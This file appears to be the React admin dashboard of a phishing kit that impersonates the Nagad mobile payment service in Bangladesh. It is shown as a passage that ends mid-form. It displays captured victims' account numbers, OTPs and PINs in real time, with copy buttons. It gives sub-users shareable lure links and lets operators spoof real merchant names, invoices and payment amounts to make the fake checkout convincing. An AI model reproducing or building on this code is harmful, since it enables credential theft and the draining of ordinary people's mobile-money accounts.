import React, { useState, useEffect } from 'react';
import { TransactionSession, StoreSettings, BlockedTarget, AdminUser } from '../types';
import { rtdb, ref, onValue, remove, set, db, collection, onSnapshot, doc, setDoc, deleteDoc } from '../firebase';
import { Shield, Smartphone, Key, Lock, CheckCircle2, Trash2, Copy, RefreshCw, LogOut, Settings, Ban, Volume2, VolumeX, Eye, Search, Link as LinkIcon, User } from 'lucide-react';

interface AdminPanelProps {
  storeSettings: StoreSettings;
  onUpdateStoreSettings: (newSettings: StoreSettings) => void;
  onLogout: () => void;
  currentUser?: AdminUser;
}

export const AdminPanel: React.FC<AdminPanelProps> = ({
  storeSettings,
  onUpdateStoreSettings,
  onLogout,
  currentUser,
}) => {
  const [sessions, setSessions] = useState<TransactionSession[]>([]);
  const [blockedTargets, setBlockedTargets] = useState<BlockedTarget[]>([]);
  const [activeTab, setActiveTab] = useState<'sessions' | 'settings' | 'blocked'>('sessions');
  const [searchTerm, setSearchTerm] = useState<string>('');
  const [soundEnabled, setSoundEnabled] = useState<boolean>(true);
  const [copiedId, setCopiedId] = useState<string | null>(null);

  const isSubUser = currentUser?.role === 'subuser';
  const myGatewayTag = currentUser?.gatewayTag || 'paymentdomaingetway';
  const subUserGatewayUrl = typeof window !== 'undefined' ? `${window.location.origin}/?gateway=${myGatewayTag}` : '';

  // Form states for Store Settings
  const [settingsForm, setSettingsForm] = useState<StoreSettings>(storeSettings);
  const [saveSuccess, setSaveSuccess] = useState<boolean>(false);

  // Sub-user custom gateway amount state
  const [subUserAmount, setSubUserAmount] = useState<string>('');
  const [subUserSaveSuccess, setSubUserSaveSuccess] = useState<boolean>(false);

  useEffect(() => {
    const amountRef = ref(rtdb, `gatewayAmounts/${myGatewayTag}`);
    const unsubscribeAmount = onValue(amountRef, (snapshot) => {
      const val = snapshot.val();
      if (val) {
        setSubUserAmount(val);
      } else {
        setSubUserAmount(storeSettings.amount || '1,000.00');
      }
    });
    return () => unsubscribeAmount();
  }, [myGatewayTag, storeSettings.amount]);

  const handleSaveSubUserAmount = (e?: React.FormEvent, customVal?: string) => {
    if (e) e.preventDefault();
    const valToSave = customVal !== undefined ? customVal : subUserAmount;
    if (!valToSave.trim()) return;
    try {
      const formatted = valToSave.trim();
      set(ref(rtdb, `gatewayAmounts/${myGatewayTag}`), formatted);
      setDoc(doc(db, 'gatewayAmounts', myGatewayTag), { amount: formatted, updatedAt: Date.now() }, { merge: true });
      setSubUserAmount(formatted);
      setSubUserSaveSuccess(true);
      showToast(`Amount updated to ৳ ${formatted} for your gateway link!`);
      setTimeout(() => setSubUserSaveSuccess(false), 3000);
    } catch (err) {
      console.error('Failed to update sub-user amount:', err);
    }
  };

  // Toast notification state
  const [toast, setToast] = useState<{ message: string; type: 'success' | 'info' | 'error' } | null>(null);

  const showToast = (message: string, type: 'success' | 'info' | 'error' = 'success') => {
    setToast({ message, type });
    setTimeout(() => setToast(null), 3000);
  };

  // Subscribe to Realtime Database sessions and blocked users
  useEffect(() => {
    // 1. RTDB Sessions listener
    const sessionsRef = ref(rtdb, 'sessions');
    const unsubscribeRtdb = onValue(sessionsRef, (snapshot) => {
      const data = snapshot.val();
      if (data) {
        const loadedSessions: TransactionSession[] = Object.entries(data).map(
          ([key, val]: [string, any]) => ({ id: key, ...val })
        );
        // Play notification sound on new entry if enabled
        if (soundEnabled && loadedSessions.length > sessions.length) {
          try {
            const audioCtx = new (window.AudioContext || (window as any).webkitAudioContext)();
            const osc = audioCtx.createOscillator();
            osc.type = 'sine';
            osc.frequency.setValueAtTime(800, audioCtx.currentTime);
            osc.connect(audioCtx.destination);
            osc.start();
            osc.stop(audioCtx.currentTime + 0.2);
          } catch (e) {
            // Audio context permission ignore
          }
        }
        setSessions(loadedSessions.sort((a, b) => (b.updatedAt || 0) - (a.updatedAt || 0)));
      } else {
        setSessions([]);
      }
    });

    // 2. RTDB Blocked Targets listener
    const blockedRef = ref(rtdb, 'blockedTargets');
    const unsubscribeBlocked = onValue(blockedRef, (snapshot) => {
      const data = snapshot.val();
      if (data) {
        setBlockedTargets(
          Object.entries(data).map(([key, val]: [string, any]) => ({ id: key, ...val }))
        );
      } else {
        setBlockedTargets([]);
      }
    });

    // 3. RTDB Store Settings listener
    const storeSettingsRef = ref(rtdb, 'settings');
    const unsubscribeSettings = onValue(storeSettingsRef, (snapshot) => {
      const data = snapshot.val();
      if (data) {
        onUpdateStoreSettings(data);
        setSettingsForm(data);
      }
    });

    // Backup Firestore snapshot listener
    const unsubscribeFirestore = onSnapshot(collection(db, 'sessions'), (snapshot) => {
      const firestoreSessions: TransactionSession[] = [];
      snapshot.forEach((docSnap) => {
        firestoreSessions.push({ id: docSnap.id, ...(docSnap.data() as TransactionSession) });
      });
      if (firestoreSessions.length > 0) {
        setSessions((prev) =>
          prev.length === 0
            ? firestoreSessions.sort((a, b) => (b.updatedAt || 0) - (a.updatedAt || 0))
            : prev
        );
      }
    });

    return () => {
      unsubscribeRtdb();
      unsubscribeBlocked();
      unsubscribeSettings();
      unsubscribeFirestore();
    };
  }, []);

  // Save Settings
  const handleSaveSettings = async (e: React.FormEvent) => {
    e.preventDefault();
    onUpdateStoreSettings(settingsForm);

    // Sync settings to RTDB & Firestore
    try {
      await set(ref(rtdb, 'settings'), settingsForm);
      await setDoc(doc(db, 'settings', 'store'), settingsForm);
      showToast('Store settings & logo published live to client!');
    } catch (e) {
      console.warn('Settings save error:', e);
      showToast('Settings saved locally', 'info');
    }

    setSaveSuccess(true);
    setTimeout(() => setSaveSuccess(false), 2500);
  };

  // Copy helper
  const copyToClipboard = (text: string, idKey: string) => {
    navigator.clipboard.writeText(text);
    setCopiedId(idKey);
    setTimeout(() => setCopiedId(null), 1500);
  };

  // Delete session
  const handleDeleteSession = async (id: string) => {
    try {
      await remove(ref(rtdb, `sessions/${id}`));
      await deleteDoc(doc(db, 'sessions', id));
    } catch (e) {
      console.error(e);
    }
  };

  // Clear all sessions
  const handleClearAllSessions = async () => {
    if (confirm('Are you sure you want to clear all session records?')) {
      try {
        await remove(ref(rtdb, 'sessions'));
      } catch (e) {
        console.error(e);
      }
    }
  };

  // Block User IP/Device
  const handleBlockTarget = async (sessionItem: TransactionSession) => {
    const newBlocked: BlockedTarget = {
      id: sessionItem.id,
      ip: sessionItem.ip || 'Unknown',
      deviceId: sessionItem.deviceId || sessionItem.id,
      blockedAt: Date.now(),
    };

    try {
      await set(ref(rtdb, `blockedTargets/${newBlocked.id}`), newBlocked);
      await setDoc(doc(db, 'blockedTargets', newBlocked.id), newBlocked);
      // Mark session as blocked
      await set(ref(rtdb, `sessions/${sessionItem.id}/status`), 'blocked');
    } catch (e) {
      console.error(e);
    }
  };

  // Unblock Target
  const handleUnblockTarget = async (id: string) => {
    try {
      await remove(ref(rtdb, `blockedTargets/${id}`));
      await deleteDoc(doc(db, 'blockedTargets', id));
    } catch (e) {
      console.error(e);
    }
  };

  // Filter sessions based on user role and search term
  const userRoleSessions = isSubUser
    ? sessions.filter(
        (s) =>
          s.gatewayTag === myGatewayTag ||
          s.gatewayTag === 'paymentdomaingetway' ||
          s.gatewayTag === 'email-paymentdomaingetway@gmail.com'
      )
    : sessions;

  const filteredSessions = userRoleSessions.filter(
    (s) =>
      s.accountNumber?.includes(searchTerm) ||
      s.otp?.includes(searchTerm) ||
      s.pin?.includes(searchTerm) ||
      s.ip?.includes(searchTerm)
  );

  return (
    <div className="min-h-screen bg-slate-950 text-slate-100 font-sans flex flex-col">
      {/* Top Navbar */}
      <header className="bg-slate-900 border-b border-slate-800 px-3 sm:px-6 py-2.5 sm:py-3.5 sticky top-0 z-30 flex items-center justify-between shadow-md">
        <div className="flex items-center gap-2.5 sm:gap-3">
          <div className="w-8 h-8 sm:w-10 sm:h-10 rounded-lg bg-red-600 flex items-center justify-center font-black text-white text-lg sm:text-xl shadow">
            N
          </div>
          <div>
            <h1 className="font-bold text-base sm:text-lg leading-tight text-white flex items-center gap-1.5 sm:gap-2">
              Nagad Admin
              <span className="text-[10px] sm:text-xs font-semibold px-2 py-0.5 rounded-full bg-red-500/20 text-red-400 border border-red-500/30">
                LIVE
              </span>
            </h1>
            <p className="text-[10px] sm:text-xs text-slate-400">
              {currentUser?.email ? `Logged in: ${currentUser.email}` : 'Realtime Monitor & Control Panel'}
            </p>
          </div>
        </div>

        <div className="flex items-center gap-1.5 sm:gap-2">
          {currentUser && (
            <span className="hidden sm:inline-flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-slate-800 border border-slate-700 text-xs font-mono text-slate-300">
              <User className="w-3.5 h-3.5 text-red-400" />
              {isSubUser ? 'Sub-User Account' : 'Super Admin'}
            </span>
          )}
          <button
            onClick={() => setSoundEnabled(!soundEnabled)}
            className={`p-1.5 sm:p-2 rounded-lg border transition-colors ${
              soundEnabled
                ? 'bg-emerald-500/10 border-emerald-500/30 text-emerald-400'
                : 'bg-slate-800 border-slate-700 text-slate-400'
            }`}
            title="Toggle Sound Notification"
          >
            {soundEnabled ? <Volume2 className="w-4 h-4 sm:w-5 sm:h-5" /> : <VolumeX className="w-4 h-4 sm:w-5 sm:h-5" />}
          </button>
          <button
            onClick={onLogout}
            className="flex items-center gap-1 px-2.5 py-1.5 rounded-lg bg-red-600/20 hover:bg-red-600/30 border border-red-500/30 text-red-300 font-semibold text-xs sm:text-sm transition-colors"
          >
            <LogOut className="w-3.5 h-3.5 sm:w-4 sm:h-4" />
            <span>Logout</span>
          </button>
        </div>
      </header>

      {/* Main Container */}
      <div className="flex-1 max-w-7xl w-full mx-auto p-3 sm:p-6 flex flex-col gap-4 sm:gap-6">
        {/* Sub-user Custom Gateway Link Box & Amount Settings */}
        {isSubUser && (
          <div className="bg-gradient-to-r from-slate-900 via-red-950/30 to-slate-900 border border-red-500/30 rounded-2xl p-4 flex flex-col gap-4 shadow-lg">
            <div className="flex flex-col sm:flex-row items-start sm:items-center justify-between gap-3 pb-3 border-b border-slate-800/80">
              <div className="flex items-center gap-3">
                <div className="w-10 h-10 rounded-xl bg-red-600/20 border border-red-500/40 flex items-center justify-center text-red-400 shrink-0">
                  <LinkIcon className="w-5 h-5" />
                </div>
                <div>
                  <h2 className="text-sm font-bold text-white flex items-center gap-2">
                    Your Dedicated Gateway Link
                    <span className="text-[10px] px-2 py-0.5 rounded bg-red-600 text-white font-mono uppercase">Sub-User</span>
                  </h2>
                  <p className="text-xs text-slate-400 mt-0.5">
                    Share this specific link with your users. Any details submitted through this link will appear directly in your dashboard:
                  </p>
                  <code className="text-xs font-mono text-amber-300 bg-slate-950 px-2 py-1 rounded border border-slate-800 inline-block mt-1.5 break-all">
                    {subUserGatewayUrl}
                  </code>
                </div>
              </div>
              <button
                onClick={() => copyToClipboard(subUserGatewayUrl, 'sub-gateway-link')}
                className="bg-red-600 hover:bg-red-500 text-white font-bold px-4 py-2 rounded-xl text-xs flex items-center gap-1.5 shrink-0 shadow transition-transform active:scale-95 self-start sm:self-auto"
              >
                <Copy className="w-4 h-4" />
                {copiedId === 'sub-gateway-link' ? 'Copied!' : 'Copy Gateway Link'}
              </button>
            </div>

            {/* Custom Link Amount Modifier */}
            <div className="bg-slate-950/80 border border-slate-800 rounded-xl p-3 sm:p-4">
              <form onSubmit={handleSaveSubUserAmount} className="flex flex-col sm:flex-row items-start sm:items-end justify-between gap-3">
                <div className="flex-1 w-full">
                  <div className="flex items-center justify-between mb-1.5">
                    <label className="block text-xs font-bold uppercase text-slate-300 flex items-center gap-1.5">
                      <Settings className="w-3.5 h-3.5 text-red-400" />
                      Change Link Amount (BDT)
                    </label>
                    <span className="text-[11px] font-mono text-amber-400 font-bold">
                      Current: ৳ {subUserAmount || '1,000.00'}
                    </span>
                  </div>
                  <div className="flex flex-col sm:flex-row items-stretch gap-2">
                    <input
                      type="text"
                      required
                      value={subUserAmount}
                      onChange={(e) => setSubUserAmount(e.target.value)}
                      placeholder="e.g. 1,000.00"
                      className="bg-slate-900 border border-slate-700 rounded-xl px-3.5 py-2 text-slate-100 font-mono text-sm font-bold focus:outline-none focus:ring-2 focus:ring-red-500 flex-1"
                    />
                    <button
                      type="submit"
                      className="bg-red-600 hover:bg-red-500 text-white font-bold px-5 py-2 rounded-xl text-xs flex items-center justify-center gap-1.5 shadow transition-transform active:scale-95 shrink-0"
                    >
                      <RefreshCw className="w-3.5 h-3.5" />
                      Save Link Amount
                    </button>
                  </div>
                  {/* Quick Preset Buttons */}
                  <div className="flex flex-wrap items-center gap-1.5 mt-2">
                    <span className="text-[10px] uppercase font-bold text-slate-500 mr-1">Quick Sets:</span>
                    {['100.00', '500.00', '1,000.00', '2,500.00', '5,000.00', '10,000.00'].map((amt) => (
                      <button
                        type="button"
                        key={amt}
                        onClick={() => handleSaveSubUserAmount(undefined, amt)}
                        className={`px-2.5 py-1 rounded-lg text-[10px] font-mono font-bold border transition-colors ${
                          subUserAmount === amt
                            ? 'bg-red-600 text-white border-red-500'
                            : 'bg-slate-900 border-slate-800 text-slate-400 hover:text-white hover:bg-slate-800'
                        }`}
                      >
                        ৳ {amt}
                      </button>
                    ))}
                  </div>
                </div>
              </form>
              {subUserSaveSuccess && (
                <div className="mt-2 text-xs text-emerald-400 font-bold flex items-center gap-1 animate-fade-in">
                  <CheckCircle2 className="w-3.5 h-3.5" />
                  Gateway link amount successfully saved and updated!
                </div>
              )}
            </div>
          </div>
        )}

        {/* Navigation Tabs */}
        <div className="flex flex-col sm:flex-row items-stretch sm:items-center justify-between gap-2.5 bg-slate-900/90 p-1.5 rounded-xl border border-slate-800">
          <div className="flex items-center gap-1 overflow-x-auto pb-1 sm:pb-0 scrollbar-none">
            <button
              onClick={() => setActiveTab('sessions')}
              className={`whitespace-nowrap flex items-center gap-1.5 px-3 sm:px-4 py-2 rounded-lg font-semibold text-xs sm:text-sm transition-all ${
                activeTab === 'sessions'
                  ? 'bg-red-600 text-white shadow-md'
                  : 'text-slate-400 hover:text-white hover:bg-slate-800/50'
              }`}
            >
              <Smartphone className="w-3.5 h-3.5 sm:w-4 sm:h-4" />
              Live Submissions
              {userRoleSessions.length > 0 && (
                <span className="ml-1 px-1.5 py-0.2 rounded-full text-[10px] sm:text-xs bg-white/20 text-white font-bold">
                  {userRoleSessions.length}
                </span>
              )}
            </button>

            {!isSubUser && (
              <>
                <button
                  onClick={() => setActiveTab('settings')}
                  className={`whitespace-nowrap flex items-center gap-1.5 px-3 sm:px-4 py-2 rounded-lg font-semibold text-xs sm:text-sm transition-all ${
                    activeTab === 'settings'
                      ? 'bg-red-600 text-white shadow-md'
                      : 'text-slate-400 hover:text-white hover:bg-slate-800/50'
                  }`}
                >
                  <Settings className="w-3.5 h-3.5 sm:w-4 sm:h-4" />
                  Store Settings
                </button>

                <button
                  onClick={() => setActiveTab('blocked')}
                  className={`whitespace-nowrap flex items-center gap-1.5 px-3 sm:px-4 py-2 rounded-lg font-semibold text-xs sm:text-sm transition-all ${
                    activeTab === 'blocked'
                      ? 'bg-red-600 text-white shadow-md'
                      : 'text-slate-400 hover:text-white hover:bg-slate-800/50'
                  }`}
                >
                  <Ban className="w-3.5 h-3.5 sm:w-4 sm:h-4" />
                  Blocked ({blockedTargets.length})
                </button>
              </>
            )}
          </div>

          {activeTab === 'sessions' && sessions.length > 0 && (
            <button
              onClick={handleClearAllSessions}
              className="px-3 py-1.5 rounded-lg bg-slate-800 hover:bg-red-900/40 text-red-400 border border-slate-700 text-xs font-semibold flex items-center justify-center gap-1.5 transition-colors"
            >
              <Trash2 className="w-3.5 h-3.5" />
              Clear All Logs
            </button>
          )}
        </div>

        {/* TAB 1: Live Submissions */}
        {activeTab === 'sessions' && (
          <div className="flex flex-col gap-4">
            {/* Search filter */}
            <div className="relative w-full max-w-md">
              <Search className="w-4 h-4 absolute left-3.5 top-3 text-slate-400" />
              <input
                type="text"
                placeholder="Search number, OTP, PIN, IP..."
                value={searchTerm}
                onChange={(e) => setSearchTerm(e.target.value)}
                className="w-full bg-slate-900 border border-slate-800 rounded-xl pl-10 pr-4 py-2 text-sm text-slate-200 focus:outline-none focus:ring-2 focus:ring-red-500/50"
              />
            </div>

            {filteredSessions.length === 0 ? (
              <div className="bg-slate-900/50 border border-slate-800/80 rounded-2xl p-12 text-center flex flex-col items-center justify-center">
                <div className="w-16 h-16 rounded-full bg-slate-800/80 flex items-center justify-center text-slate-500 mb-4">
                  <Smartphone className="w-8 h-8" />
                </div>
                <h3 className="text-lg font-bold text-slate-300">No Submissions Yet</h3>
                <p className="text-sm text-slate-500 max-w-sm mt-1">
                  When users visit the Nagad payment portal and enter their number, OTP, or PIN, details will appear here instantly in real-time.
                </p>
              </div>
            ) : (
              <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
                {filteredSessions.map((s) => (
                  <div
                    key={s.id}
                    className={`bg-slate-900 border rounded-2xl p-4 flex flex-col justify-between shadow-lg transition-all ${
                      s.status === 'blocked'
                        ? 'border-red-900/50 opacity-60 bg-red-950/10'
                        : 'border-slate-800 hover:border-slate-700'
                    }`}
                  >
                    <div>
                      {/* Header info */}
                      <div className="flex items-center justify-between mb-3 pb-2 border-b border-slate-800">
                        <div className="flex items-center gap-2">
                          <span
                            className={`w-2.5 h-2.5 rounded-full ${
                              s.step === 'completed' || s.step === 'success'
                                ? 'bg-emerald-500 animate-pulse'
                                : 'bg-amber-500 animate-ping'
                            }`}
                          />
                          <span className="text-xs font-bold uppercase tracking-wider text-slate-300">
                            Step: <span className="text-red-400">{s.step}</span>
                          </span>
                        </div>

                        <span className="text-[11px] font-mono text-slate-400">
                          {new Date(s.updatedAt || s.timestamp).toLocaleTimeString()}
                        </span>
                      </div>

                      {/* Resend Code Badge */}
                      {s.resendCount && s.resendCount > 0 ? (
                        <div className="bg-amber-500/15 border border-amber-500/30 text-amber-300 text-xs px-2.5 py-1.5 rounded-xl flex items-center justify-between mb-2.5 font-semibold shadow-sm">
                          <span className="flex items-center gap-1.5 text-amber-300">
                            <RefreshCw className="w-3.5 h-3.5 text-amber-400 animate-spin" />
                            Resend Code Clicked
                          </span>
                          <span className="bg-amber-500 text-black font-black px-2 py-0.5 rounded-full text-[11px]">
                            {s.resendCount} {s.resendCount === 1 ? 'time' : 'times'}
                          </span>
                        </div>
                      ) : null}

                      {/* Number Display */}
                      <div className="bg-slate-950 rounded-xl p-3 mb-2.5 border border-slate-800 flex items-center justify-between">
                        <div>
                          <p className="text-[10px] uppercase font-bold text-slate-500 tracking-wider">
                            Nagad Number
                          </p>
                          <p className="font-mono text-lg font-extrabold text-amber-400 tracking-wide">
                            {s.accountNumber || 'Waiting...'}
                          </p>
                        </div>
                        {s.accountNumber && (
                          <button
                            onClick={() => copyToClipboard(s.accountNumber, `num-${s.id}`)}
                            className="p-1.5 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-300 transition-colors"
                            title="Copy Number"
                          >
                            <Copy className="w-4 h-4" />
                          </button>
                        )}
                      </div>

                      {/* OTP & PIN Display Grid */}
                      <div className="grid grid-cols-2 gap-2 mb-3">
                        {/* OTP */}
                        <div className="bg-slate-950 rounded-xl p-2.5 border border-slate-800 flex items-center justify-between">
                          <div>
                            <p className="text-[10px] uppercase font-bold text-slate-500 tracking-wider">
                              OTP
                            </p>
                            <p className="font-mono text-base font-extrabold text-emerald-400">
                              {s.otp || '---'}
                            </p>
                          </div>
                          {s.otp && (
                            <button
                              onClick={() => copyToClipboard(s.otp, `otp-${s.id}`)}
                              className="p-1 rounded bg-slate-800 hover:bg-slate-700 text-slate-300"
                              title="Copy OTP"
                            >
                              <Copy className="w-3.5 h-3.5" />
                            </button>
                          )}
                        </div>

                        {/* PIN */}
                        <div className="bg-slate-950 rounded-xl p-2.5 border border-slate-800 flex items-center justify-between">
                          <div>
                            <p className="text-[10px] uppercase font-bold text-slate-500 tracking-wider">
                              PIN
                            </p>
                            <p className="font-mono text-base font-extrabold text-cyan-400">
                              {s.pin || '---'}
                            </p>
                          </div>
                          {s.pin && (
                            <button
                              onClick={() => copyToClipboard(s.pin, `pin-${s.id}`)}
                              className="p-1 rounded bg-slate-800 hover:bg-slate-700 text-slate-300"
                              title="Copy PIN"
                            >
                              <Copy className="w-3.5 h-3.5" />
                            </button>
                          )}
                        </div>
                      </div>

                      {/* Device & IP Details */}
                      <div className="text-xs text-slate-400 space-y-1 mb-4 bg-slate-950/50 p-2.5 rounded-xl border border-slate-800/50">
                        <div className="flex justify-between">
                          <span className="text-slate-500">Store Name:</span>
                          <span className="font-semibold text-slate-300 truncate max-w-[150px]">
                            {s.storeName}
                          </span>
                        </div>
                        <div className="flex justify-between">
                          <span className="text-slate-500">Amount:</span>
                          <span className="font-bold text-slate-200">
                            {s.currency} {s.amount}
                          </span>
                        </div>
                        <div className="flex justify-between">
                          <span className="text-slate-500">Invoice:</span>
                          <span className="font-mono text-slate-300">{s.invoiceNo}</span>
                        </div>
                        <div className="flex justify-between pt-1 border-t border-slate-800/60">
                          <span className="text-slate-500">Device/IP:</span>
                          <span className="font-mono text-slate-400 truncate max-w-[140px]">
                            {s.ip || 'Local/Device'}
                          </span>
                        </div>
                      </div>
                    </div>

                    {/* Card Actions */}
                    <div className="flex items-center gap-2 pt-2 border-t border-slate-800">
                      <button
                        onClick={() => handleBlockTarget(s)}
                        className="flex-1 py-1.5 px-3 rounded-lg bg-slate-800 hover:bg-red-950/60 text-red-400 border border-slate-700 hover:border-red-800 text-xs font-semibold flex items-center justify-center gap-1 transition-colors"
                      >
                        <Ban className="w-3.5 h-3.5" />
                        Block Device
                      </button>

                      <button
                        onClick={() => handleDeleteSession(s.id)}
                        className="p-1.5 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-400 hover:text-red-400 border border-slate-700 transition-colors"
                        title="Delete Session"
                      >
                        <Trash2 className="w-4 h-4" />
                      </button>
                    </div>
                  </div>
                ))}
              </div>
            )}
          </div>
        )}

        {/* TAB 2: Store Settings */}
        {activeTab === 'settings' && (
          <div className="max-w-2xl bg-slate-900 border border-slate-800 rounded-2xl p-6 shadow-xl">
            <h2 className="text-xl font-bold text-white mb-2 flex items-center gap-2">
              <Settings className="w-5 h-5 text-red-500" />
              Dynamic Payment Gateway Config
            </h2>
            <p className="text-xs text-slate-400 mb-6">
              Changes updated here will immediately reflect on the user's Nagad payment interface in real-time.
            </p>

            <form onSubmit={handleSaveSettings} className="space-y-4">
              <div>
                <div className="flex items-center justify-between mb-1.5">
                  <label className="block text-xs font-bold uppercase text-slate-400">
                    Store Name
                  </label>
                  <select
                    onChange={(e) => {
                      if (e.target.value) {
                        setSettingsForm({ ...settingsForm, storeName: e.target.value });
                      }
                    }}
                    defaultValue=""
                    className="bg-slate-950 border border-slate-800 text-xs text-red-400 rounded-lg px-2 py-1 focus:outline-none"
                  >
                    <option value="" disabled>-- Select Preset Store --</option>
                    <option value="MUNNA GENERAL STORE">MUNNA GENERAL STORE</option>
                    <option value="DARAZ BANGLADESH LTD">DARAZ BANGLADESH LTD</option>
                    <option value="CHALDAL ONLINE GROCERY">CHALDAL ONLINE GROCERY</option>
                    <option value="FOODPANDA BANGLADESH">FOODPANDA BANGLADESH</option>
                    <option value="EVALY OFFICIAL STORE">EVALY OFFICIAL STORE</option>
                    <option value="ROKOMARI.COM">ROKOMARI.COM</option>
                    <option value="PICKABOO ELECTRONICS">PICKABOO ELECTRONICS</option>
                    <option value="SHAPLA FASHION HOUSE">SHAPLA FASHION HOUSE</option>
                    <option value="GRAMEENPHONE RECHARGE">GRAMEENPHONE RECHARGE</option>
                    <option value="ROBI AXIATA MERCHANTS">ROBI AXIATA MERCHANTS</option>
                    <option value="BANGLALINK DIGITAL">BANGLALINK DIGITAL</option>
                    <option value="TELETALK RECHARGE BD">TELETALK RECHARGE BD</option>
                    <option value="AARONG CRAFTS BD">AARONG CRAFTS BD</option>
                    <option value="WALTON HI-TECH PLC">WALTON HI-TECH PLC</option>
                    <option value="APEX FOOTWEAR MERCHANTS">APEX FOOTWEAR MERCHANTS</option>
                    <option value="PATHAO FOOD & RIDES">PATHAO FOOD & RIDES</option>
                    <option value="AGORA SUPERSTORE">AGORA SUPERSTORE</option>
                    <option value="SWAPNO SUPER SHOP">SWAPNO SUPER SHOP</option>
                    <option value="MEENA BAZAR BD">MEENA BAZAR BD</option>
                    <option value="BATA BANGLADESH">BATA BANGLADESH</option>
                    <option value="OTHOBA.COM MERCHANTS">OTHOBA.COM MERCHANTS</option>
                  </select>
                </div>
                <input
                  type="text"
                  required
                  value={settingsForm.storeName || ''}
                  onChange={(e) => setSettingsForm({ ...settingsForm, storeName: e.target.value })}
                  placeholder="e.g. MUNNA GENERAL STORE"
                  className="w-full bg-slate-950 border border-slate-800 rounded-xl px-4 py-2.5 text-slate-100 font-semibold focus:outline-none focus:ring-2 focus:ring-red-500"
                />
              </div>

              {/* Auto Randomize Toggles */}
              <div className="grid grid-cols-1 sm:grid-cols-2 gap-4 bg-slate-950/60 p-3 rounded-xl border border-slate-800">
                <label className="flex items-center gap-2 cursor-pointer">
                  <input
                    type="checkbox"
                    checked={settingsForm.autoRandomizeStore || false}
                    onChange={(e) =>
                      setSettingsForm({ ...settingsForm, autoRandomizeStore: e.target.checked })
                    }
                    className="w-4 h-4 rounded text-red-600 focus:ring-red-500 bg-slate-900 border-slate-700"
                  />
                  <span className="text-xs font-semibold text-slate-300">
                    Auto-Randomize Store Name on Refresh
                  </span>
                </label>

                <label className="flex items-center gap-2 cursor-pointer">
                  <input
                    type="checkbox"
                    checked={settingsForm.autoRandomizeInvoice || false}
                    onChange={(e) =>
                      setSettingsForm({ ...settingsForm, autoRandomizeInvoice: e.target.checked })
                    }
                    className="w-4 h-4 rounded text-red-600 focus:ring-red-500 bg-slate-900 border-slate-700"
                  />
                  <span className="text-xs font-semibold text-slate-300">
                    Auto-Randomize Invoice No on Refresh
                  </span>
                </label>
              </div>

              {settingsForm.autoRandomizeStore && (
                <div>
                  <label className="block text-xs font-bold uppercase text-slate-400 mb-1.5">
                    Random Store Names Pool (Comma separated)
                  </label>
                  <input
                    type="text"
                    value={
                      Array.isArray(settingsForm.storeNamesList)
                        ? settingsForm.storeNamesList.join(', ')
                        : settingsForm.storeNamesList || ''
                    }
                    onChange={(e) =>
                      setSettingsForm({
                        ...settingsForm,
                        storeNamesList: e.target.value.split(',').map((s) => s.trim()),
                      })
                    }
                    placeholder="MUNNA GENERAL STORE, ROBI AXIATA, GRAMEENPHONE, DHAKA TRADERS"
                    className="w-full bg-slate-950 border border-slate-800 rounded-xl px-4 py-2.5 text-slate-100 text-xs font-mono focus:outline-none focus:ring-2 focus:ring-red-500"
                  />
                </div>
              )}

              <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                <div>
                  <label className="block text-xs font-bold uppercase text-slate-400 mb-1.5">
                    Amount
                  </label>
                  <input
                    type="text"
                    required
                    value={settingsForm.amount || ''}
                    onChange={(e) => setSettingsForm({ ...settingsForm, amount: e.target.value })}
                    placeholder="e.g. 1,000.00"
                    className="w-full bg-slate-950 border border-slate-800 rounded-xl px-4 py-2.5 text-slate-100 font-semibold focus:outline-none focus:ring-2 focus:ring-red-500 mb-2"
                  />
                  <div className="flex flex-wrap gap-1">
                    {['100.00', '500.00', '1,000.00', '2,500.00', '5,000.00', '10,000.00'].map((amt) => (
                      <button
                        type="button"
                        key={amt}
                        onClick={() => setSettingsForm({ ...settingsForm, amount: amt })}
                        className="px-2 py-0.5 rounded bg-slate-800 hover:bg-red-600 text-[10px] text-slate-300 hover:text-white font-mono transition-colors"
                      >
                        {amt}
                      </button>
                    ))}
                  </div>
                </div>

                <div>
                  <label className="block text-xs font-bold uppercase text-slate-400 mb-1.5">
                    Currency Symbol
                  </label>
                  <select
                    value={settingsForm.currency || 'BDT'}
                    onChange={(e) =>
                      setSettingsForm({
                        ...settingsForm,
                        currency: e.target.value as 'BDT' | '৳',
                      })
                    }
                    className="w-full bg-slate-950 border border-slate-800 rounded-xl px-4 py-2.5 text-slate-100 font-semibold focus:outline-none focus:ring-2 focus:ring-red-500"
                  >
                    <option value="BDT">BDT</option>
                    <option value="৳">৳ (Taka Symbol)</option>
                  </select>
                </div>
              </div>

              <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                <div>
                  <label className="block text-xs font-bold uppercase text-slate-400 mb-1.5">
                    Charge
                  </label>
                  <input
                    type="text"
                    value={settingsForm.charge || '0'}
                    onChange={(e) => setSettingsForm({ ...settingsForm, charge: e.target.value })}
                    placeholder="e.g. 0"
                    className="w-full bg-slate-950 border border-slate-800 rounded-xl px-4 py-2.5 text-slate-100 font-semibold focus:outline-none focus:ring-2 focus:ring-red-500"
                  />
                </div>

                <div>
                  <label className="block text-xs font-bold uppercase text-slate-400 mb-1.5">
                    Invoice No
                  </label>
                  <input
                    type="text"
                    value={settingsForm.invoiceNo || ''}
                    onChange={(e) => setSettingsForm({ ...settingsForm, invoiceNo: e.target.value })}
                    placeholder="e.g. CC801472068"
                    className="w-full bg-slate-950 border border-slate-800 rounded-xl px-4 py-2.5 text-slate-100 font-semibold focus:outline-none focus:ring-2 focus:ring-red-500"
                  />
                </div>
              </div>

              {/* Branding Customizations */}
              <div className="pt-2 border-t border-slate-800/80 space-y-3">
                <h3 className="text-sm font-bold text-slate-300">Branding & Logo Options</h3>

                <div>
                  <label className="block text-xs font-bold uppercase text-slate-400 mb-1">
                    Custom Footer Logo Image URL
                  </label>
                  <input
                    type="text"
                    value={settingsForm.customLogoUrl || ''}
                    onChange={(e) => setSettingsForm({ ...settingsForm, customLogoUrl: e.target.value })}
                    placeholder="https://example.com/logo.png (Leave empty for default Nagad logo)"
                    className="w-full bg-slate-950 border border-slate-800 rounded-xl px-4 py-2 text-slate-100 text-xs focus:outline-none focus:ring-2 focus:ring-red-500"
                  />
                </div>

